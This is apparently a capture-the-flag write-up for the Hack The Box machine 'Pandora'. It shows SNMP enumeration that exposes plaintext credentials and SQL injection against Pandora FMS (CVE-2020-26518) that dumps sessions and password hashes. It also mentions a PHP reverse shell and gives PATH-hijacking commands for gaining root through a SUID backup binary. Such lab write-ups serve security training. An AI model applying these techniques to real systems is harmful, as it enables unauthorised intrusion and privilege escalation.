# Pandora

## Enumeration
### nmap

```
└──╼ $nmap -sC -sV 10.129.211.58 -vv

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

```
└──╼ $sudo nmap -sV -sU -vv 10.10.11.136

Bug in snmp-win32-software: no string output.
PORT    STATE         SERVICE REASON
68/udp  open|filtered dhcpc   no-response
161/udp open          snmp    udp-response ttl 64
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 3.81 Mb sent, 3.81 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:68:1b (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 622.23 Mb sent, 21.09 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:22      10.10.14.52:53300
|   TCP  10.10.11.136:22      10.10.14.66:54382
|   TCP  10.10.11.136:22      10.10.14.230:50242
|   TCP  10.10.11.136:22      10.10.16.14:39486
|   TCP  10.10.11.136:22      10.10.16.14:39508
|   TCP  10.10.11.136:55910   10.10.14.66:4444
|   TCP  10.10.11.136:59612   10.10.14.230:4444
|   TCP  10.10.11.136:60112   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:44164      127.0.0.1:80
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes: 
|   1: 
|     Name: systemd

...

|_  44956: 
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 25m11.75s (151175 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 25m11s


```
### ffuf
```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 33560, Words: 13127, Lines: 908]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```
The website doesnt provide much info...so we focus on the SNMP (simple network management protocol) server on UDP port 161

This takes alot of patience

```
└──╼ $snmpwalk -v 2c 10.10.11.136 -c public
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (294326) 0:49:03.26
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (64) 0:00:00.64
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (63) 0:00:00.63
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (63) 0:00:00.63
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (63) 0:00:00.63
...
iso.3.6.1.2.1.25.4.2.1.5.669 = ""
iso.3.6.1.2.1.25.4.2.1.5.670 = ""
iso.3.6.1.2.1.25.4.2.1.5.694 = ""
iso.3.6.1.2.1.25.4.2.1.5.709 = ""
iso.3.6.1.2.1.25.4.2.1.5.718 = ""
iso.3.6.1.2.1.25.4.2.1.5.722 = ""
iso.3.6.1.2.1.25.4.2.1.5.771 = ""
iso.3.6.1.2.1.25.4.2.1.5.772 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.786 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.788 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.791 = ""
iso.3.6.1.2.1.25.4.2.1.5.794 = ""
iso.3.6.1.2.1.25.4.2.1.5.856 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.868 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.869 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.877 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.889 = ""
iso.3.6.1.2.1.25.4.2.1.5.893 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.904 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.951 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.980 = ""
iso.3.6.1.2.1.25.4.2.1.5.1106 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1133 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1176 = STRING: "--user"
iso.3.6.1.2.1.25.4.2.1.5.1178 = ""
iso.3.6.1.2.1.25.4.2.1.5.1437 = ""
iso.3.6.1.2.1.25.4.2.1.5.1515 = ""
iso.3.6.1.2.1.25.4.2.1.5.1516 = ""
iso.3.6.1.2.1.25.4.2.1.5.1658 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1659 = STRING: "-c /bin/sh"
iso.3.6.1.2.1.25.4.2.1.5.1660 = ""
iso.3.6.1.2.1.25.4.2.1.5.1669 = STRING: "-c import pty;pty.spawn(\"/bin/bash\");"
iso.3.6.1.2.1.25.4.2.1.5.1670 = ""
iso.3.6.1.2.1.25.4.2.1.5.2378 = ""

```
Now we have `daniel:HotelBabylon23`

SSH works so we have access

```
daniel@pandora:~$ ls -al
total 512
drwxr-xr-x 6 daniel daniel   4096 Jan 15 12:50 .
drwxr-xr-x 4 root   root     4096 Dec  7 14:32 ..
lrwxrwxrwx 1 daniel daniel      9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel   3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel   4096 Jan 15 12:03 .cache
drwx------ 4 daniel daniel   4096 Jan 15 12:48 .gnupg
-rw-rw-r-- 1 daniel daniel    250 Jan 15 12:23 .host_check
drwxrwxr-x 3 daniel daniel   4096 Jan 15 12:50 .local
-rw------- 1 daniel daniel     90 Jan 15 12:38 .mysql_history
-rw-r--r-- 1 daniel daniel    807 Feb 25  2020 .profile
drwx------ 2 daniel daniel   4096 Dec  7 14:32 .ssh
-rwxrwxr-x 1 daniel daniel 476147 Sep 27 11:53 linpeas.sh
```

No flage here but there is another user `matt`

```
daniel@pandora:/home$ ls
daniel  matt
```
We need to lateral pivot to matt to access his folder

After trying to fool around I just decided to use `linpeas` 

```
════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS
pandora
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad

```
Hmmm...

```
daniel@pandora:~$ netstat -tuplen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        21038      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          23938      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        25371      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          24913      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          23940      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        21037      -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           0          24086      -                   
udp6       0      0 ::1:161                 :::*                                0          24087      -                   
```

It looks like there is a local web service `pandora` 

```
daniel@pandora:~$ curl pandora.htb
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

Indeed! now we can port forward the port 80 to access it on our machine

```
└──╼ $sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136
...
```
sudo because port 80...and I am not really confortable with that

too lazy to change port now

Anyway we have access to pandora in our browser at `http://127.0.0.1/pandora_console/`

But we need to login???

should we bruteforce that?? sqli?

The version is `v7.0NG.742_FIX_PERL2020` so lets search for public exploits first

There is [critical sqli here!](https://nvd.nist.gov/vuln/detail/CVE-2020-26518)

You have to actually understand the exploit here

you can use sqlmap...thats what we gonna do

```
Database: pandora
Table: tsessions_php
[143 entries]
+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+
| id_session                 | data                                                                                                   | last_active |
+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                                                                               | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                                                                   | 1638789018  |
| 0fp9ttm5cprlnmi3do4u3c960s | id_usuario|s:6:"daniel";                                                                               | 1642249394  |
| 0noovdm3frqrls78703nq4mbep | NULL                                                                                                   | 1642252241  |
| 0rk3k73mso06b2b9ju4eshm1un | NULL                                                                                                   | 1642256306  |
| 1e68l7fuito7v1lktnpn635l1a | NULL                                                                                                   | 1642256346  |
| 1h0ce88lltl8bjrrild3l96bn3 | NULL                                                                                                   | 1642256636  |
| 1kkfm035ph6rjjsu32tqdmhr1l | NULL                                                                                                   | 1642251729  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                                                                   | 1638792211  |
| 28e5ggtoo4pu5ssf82vgdbo67e | NULL                                                                                                   | 1642252262  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                                                                   | 1638786129  |
| 31galh1kg2fjldkdsm50ihfvmn | NULL                                                                                                   | 1642252250  |
| 32vs4nk0alq4ojdlj2d5t1atua | NULL                                                                                                   | 1642251775  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                                                                               | 1638540332  |
| 39je3dui9muj61el0ajpehpv9n | NULL                                                                                                   | 1642255562  |
| 3hb6l5jqi4u13o771rb8jbiora | NULL                                                                                                   | 1642255995  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                                                                   | 1638795380  |
| 3s9msmfod0640g50g7hobrsa5c | NULL                                                                                                   | 1642256529  |
| 4dl98gvfg46unv6t9f7qi3ek46 | NULL                                                                                                   | 1642255404  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                                                                   | 1638786842  |
| 4k9f22b30sri97c27igd8265e7 | NULL                                                                                                   | 1642256071  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                                                                               | 1638535373  |
| 5507qshgm3cilfequuhc0vbd88 | NULL                                                                                                   | 1642251774  |
| 59ecsv5eot3km7cssr376ltels | NULL                                                                                                   | 1642256590  |
| 59qae699l0971h13qmbpqahlls | NULL                                                                                                   | 1638787305  |
| 5a3d2ci231hdnkj4qg4827mat5 | NULL                                                                                                   | 1642255728  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                                                                   | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                                                                               | 1638281946  |
| 5jjvs0vpt8korhqn5jk2evnq3e | id_usuario|s:6:"daniel";                                                                               | 1642253922  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                                                                               | 1641195617  |
| 69nb7ja8gr65od3504npchpmm2 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                   | 1642248670  |
| 6jubkm95esfvh7hvfr1br4524j | NULL                                                                                                   | 1642255665  |
| 75u5cr9e2leofe7i7f6rtejtqv | NULL                                                                                                   | 1642254823  |
| 7b4beandov0k29v1tiam9fennd | NULL                                                                                                   | 1642256750  |
| 7bc9q54jrtb8qpve63hfavc90j | NULL                                                                                                   | 1642252793  |
| 7g8fnmeos7hh0uhv1v53ggt9ik | id_usuario|s:6:"daniel";                                                                               | 1642254664  |
| 7k7k8a79kbg3lvpmht5o2k8n6j | id_usuario|s:6:"daniel";                                                                               | 1642254781  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                                                                   | 1623957150  |
| 8dokjkqgfd0sdpd6gdo3r5t0en | NULL                                                                                                   | 1642248222  |
| 8g52f9heq0rm3rc6t6uq0dhuq3 | NULL                                                                                                   | 1642252230  |
| 8igo7op44cgjo4eangtj80cad3 | NULL                                                                                                   | 1642255821  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                                                                               | 1638446321  |
| 8tcl6sk6vu6j6a5d02osr01013 | NULL                                                                                                   | 1642250348  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                                                                   | 1638787267  |
| 9o6at3frirgg2i4aena4qou6kg | NULL                                                                                                   | 1642256948  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                                                                               | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                                                                   | 1638795315  |
| a3pcpofqtmqmk3pdoe62rqk3qa | NULL                                                                                                   | 1642256527  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                                                                               | 1638881664  |
| ahlrq5ae08j9gj71v7gcdeoald | NULL                                                                                                   | 1642255580  |
| auiqnr0k4eis0u0ie9t9a8vetk | NULL                                                                                                   | 1642256011  |
| b22846r629jp1d4hic064ecnsr | NULL                                                                                                   | 1642252260  |
| b2uc7i1u4rnpcm4kn1k4mokpv6 | NULL                                                                                                   | 1642253306  |
| buivook11ompjooecu693pa06n | NULL                                                                                                   | 1642253168  |
| bvrses6d4ugb4aac6m6aih8pni | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                   | 1642256901  |
| c2pn0tlma9mtsrcka1udnr2smj | NULL                                                                                                   | 1642255899  |
| c9s6jmohjqb63b6dkhi5afoi92 | NULL                                                                                                   | 1642256111  |
| coepa4mmqlc6v50drsdgcd4jv8 | NULL                                                                                                   | 1642256571  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                                                                   | 1638787213  |
| cqq0n6img6a2jjm0aqdbnro3v9 | NULL                                                                                                   | 1642256346  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                                                                   | 1638786277  |
| d4smkva0141gn47p9a5lta2j8i | id_usuario|s:6:"daniel";                                                                               | 1642248179  |
| ecac9rtrbja2d0rruk5utb57ut | NULL                                                                                                   | 1642256038  |
| eepgdqbaabeo9qg7gs7hpft829 | NULL                                                                                                   | 1642254933  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                                                                               | 1641200284  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                                                                               | 1641200284  |
| f2tmcfm3vuu8g0k7kb83ifnjaj | NULL                                                                                                   | 1642255197  |
| f60387s4lonrbjhpl081p1pfr9 | NULL                                                                                                   | 1642255911  |
| f9tfi75r0kr0kve324lcgh1p3c | NULL                                                                                                   | 1642255770  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                                                                   | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                                                                   | 1638786762  |
| g04icketda1vud5cc5psrfqe9s | NULL                                                                                                   | 1642255548  |
| g0h7pdi82df5t0g50vpug8u33l | NULL                                                                                                   | 1642256389  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                                                                               | 1638783230  |
| g2qm6djq20s1chie23jisp4k6r | NULL                                                                                                   | 1642256177  |
| g2uh4b2h23e11323qcqbejf5qv | NULL                                                                                                   | 1642256695  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                    | 1638796349  |
| g80umt6oum7g8eo5k1e4dshb36 | NULL                                                                                                   | 1642252203  |
| g8tjcaf0eqij58h309cpil64qn | NULL                                                                                                   | 1642250454  |
| gaff8ier0qai2cd7k8qn13u3ef | NULL                                                                                                   | 1642251729  |
| gb2hsg7hurgi0ftd2a78r90b38 | NULL                                                                                                   | 1642256138  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                                                                   | 1638786349  |
| gifnsv3mc99q6n3h92cmpi0dq9 | NULL                                                                                                   | 1642256092  |
| gj14g23r7l9hgh8juvldh0ut8o | NULL                                                                                                   | 1642251769  |
| go7lfbo67ske4vhqmmimd24qgq | NULL                                                                                                   | 1642254935  |
| gpqv4idgngjo6ad1oj9ed3ae70 | NULL                                                                                                   | 1642255567  |
| h1nf0npt7pq4ohsrqkuaq37e7j | NULL                                                                                                   | 1642248541  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                                                                   | 1638540345  |
| hme1sbui9elnnq7s9bjv1e407t | NULL                                                                                                   | 1642253298  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                                                                               | 1638168492  |
| htd91ftnmv7ql6shom4h9j5a9r | NULL                                                                                                   | 1642250457  |
| i2kdvvipbntfqtt0ipbcrur9hn | id_usuario|s:6:"daniel";                                                                               | 1642256002  |
| i4jcoeicdalg68i01hofr2f25o | NULL                                                                                                   | 1642252162  |
| i8l2espg4m5t0c2hqv7o3v0akv | NULL                                                                                                   | 1642252202  |
| igkfct8knb94q1uqdq7iqi6ann | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                   | 1642248361  |
| ih0pngbpvqerfdghbo0vgc0s8g | NULL                                                                                                   | 1642256591  |
| ij6gi29ekqg57k4h9aap1jp7sv | NULL                                                                                                   | 1642256083  |
| iso7ej4vksale9267kr645s3n0 | NULL                                                                                                   | 1642256069  |
| itceipfk0krff4e6uhhuijv3i3 | NULL                                                                                                   | 1642248279  |
| j1a6dgvacqk22vp5br130d5f2q | NULL                                                                                                   | 1642255322  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                                                                               | 1638456173  |
| jipl9gdlrus4dmagttg5mjn4ac | NULL                                                                                                   | 1642251774  |
| jplp9iknec2re3ab0fs84qlrf8 | NULL                                                                                                   | 1642248484  |
| khvhl1594h2f660rog37tda62i | NULL                                                                                                   | 1642255197  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                                                                   | 1638787808  |
| ldbpe02u54mvu3d6hlf8el6s0n | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:"337079587bc904044c16fd2d36651082"; | 1642256980  |
| ln8fsk1d1nu64j6h9rhp6blvi3 | NULL                                                                                                   | 1642252308  |
| lt4a150l5u28u8heq3gu0p8jei | NULL                                                                                                   | 1642252207  |
| mc14np8d1l9oa01qugibfmb7kj | NULL                                                                                                   | 1642252252  |
| mlvf0puv1skeniqoo9musgrri3 | NULL                                                                                                   | 1642252255  |
| mrfnr001064bk38va6tu9r107p | NULL                                                                                                   | 1642252229  |
| n3b5fd80gvr5c5oh1vkg68mghv | NULL                                                                                                   | 1642255375  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                                                                   | 1638796348  |
| nh1lh616di0m6rd6ve6m6dri23 | NULL                                                                                                   | 1642255805  |
| njkn8j2ss2pl5mik7go9ukb7gq | NULL                                                                                                   | 1642255851  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                                                                               | 1638540482  |
| o3kuq4m5t5mqv01iur63e1di58 | NULL                                                                                                   | 1638540482  |
| oe33rv1s7avol02nl9fhutlutn | NULL                                                                                                   | 1642254941  |
| ogbllme3nahi99i6buhddt8noe | NULL                                                                                                   | 1642252185  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                                                                               | 1637667827  |
| oveq606vosae6rb85fuh31ofvu | NULL                                                                                                   | 1642255574  |
| pimma20ob1qpjsnus082m66a30 | NULL                                                                                                   | 1642252427  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                                                                               | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                                                                   | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                                                                   | 1638787677  |
| r0n3boj269gibi6doevp50l9q8 | NULL                                                                                                   | 1642250678  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                                                                               | 1638889082  |
| rl69bgt5qnt5bui4ac6gpi2gj6 | NULL                                                                                                   | 1642251769  |
| rn2q61enf3iu9mh19oi1t92e9p | NULL                                                                                                   | 1642256084  |
| rnbsb9jb7m2omq9mofndidqkli | NULL                                                                                                   | 1642252216  |
| rrdbjscoeucag1odubp654fvi3 | NULL                                                                                                   | 1642252201  |
| rtnujmo44705j3ntggnsa6q5oh | NULL                                                                                                   | 1642251769  |
| scpmhrbospg4bihat9tfn3dg3f | NULL                                                                                                   | 1642256577  |
| t01g54uegelrt23ofr28v6n1oh | id_usuario|s:6:"daniel";                                                                               | 1642255283  |
| t299dm8up7qdc3r64hkb0kr7rl | NULL                                                                                                   | 1642255462  |
| t8l2po0cmjakr1erf4h5j7rqvk | NULL                                                                                                   | 1642252188  |
| toof3upfkvspucomfubldov57f | NULL                                                                                                   | 1642255528  |
| ts9u9g9m4hj8kk8ilpvg0uneik | NULL                                                                                                   | 1642252237  |
| u14k2m5nl53ns5coo47qf54a6n | NULL                                                                                                   | 1642255067  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                                                                               | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                                                                               | 1638793297  |
| udigso7inb457t8i6oq9turvqh | NULL                                                                                                   | 1642256622  |
| uqrsof20o7frqk0jmpqabe6a13 | NULL                                                                                                   | 1642256151  |
+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+

Database: pandora                                                                                                                                                                                                                          
Table: tpassword_history
[3 entries]
+---------+---------+---------------------+-------------------------------------------+---------------------+
| id_pass | id_user | date_end            | password                                  | date_begin          |
+---------+---------+---------------------+-------------------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc          | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6          | 2021-06-17 00:11:54 |
| 3       | admin   | 0000-00-00 00:00:00 | ab4f63f9ac65152575886860dde480a1 (azerty) | 2022-01-15 15:32:18 |
+---------+---------+---------------------+-------------------------------------------+---------------------+

```
You need then to replace your PHPSESSID cookie with admin cookie

If you access the dashboard upload a clasic php reverse shell

For an easier approach you can use [this](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

This worked faster and I got user flag!

```
$ cd /home/matt
$ ls
user.txt
$ 
$ cat user.txt
bro_this_flag_is_definitelly_to_own
```

## privilege escalation

checking for SUID (a classic)

```
$ find / -perm -u=s 2> /dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1


```
`/usr/bin/pandora_backup` is the most outstanding one

```
pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
```
lol...Its a `path hijacking`

But I need a solid shell...lets drop ssh keys and connect

use `ssh-keygen`, set `chmod 600` everywhere, add `id_rsa.pub` to `authorized_keys`...profit

Then just do the classics

```
matt@pandora:~$ cd /tmp
matt@pandora:/tmp$ echo "/bin/sh" > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ export PATH=$(pwd):$PATH
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
# cd /root
# ls
root.txt
# cat root.txt
root_flag_was_a_bit_easier_but_not_free

```

I already said hackthebox did not have any easy box

This confirms it! when they say its easy, expect medium...BUT this ONE was just HARD!

But its always fun learning through pain! XD

